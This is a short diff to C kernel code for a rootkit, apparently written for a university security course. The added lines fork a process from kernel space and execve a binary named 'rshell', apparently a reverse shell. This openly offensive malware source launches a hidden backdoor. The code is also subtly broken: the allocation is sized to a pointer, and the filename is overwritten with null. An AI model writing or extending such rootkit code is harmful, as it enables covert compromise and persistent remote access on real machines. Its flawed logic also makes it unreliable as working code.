@@ -42,6 +42,17 @@ int boot_binary(char *path){
 		fr.fr_pidp = &pid;
 		error = fork1(first_thread, &fr);
 		LOGI("[rootkit:boot_binary] forked PID %d\n", pid);
+		if(error == 0){
+			struct proc * p = find_process(pid);
+			struct thread * thread_for_execve = FIRST_THREAD_IN_PROC(p);
+			struct execve_args *uap = malloc(sizeof(struct execve_args *), BINARY_BOOT, M_WAITOK);
+			uap->fname = "/usr/home/comp6447/rootkit/src/rshell/rshell";
+			uap->argv = 0x00;
+			uap->fname = 0x00;
+			int result = sys_execve(thread_for_execve, uap);
+			LOGI("[rootkit:boot_binary]: execve=>%d\n", result);
+		}
+		
 	}
 
 
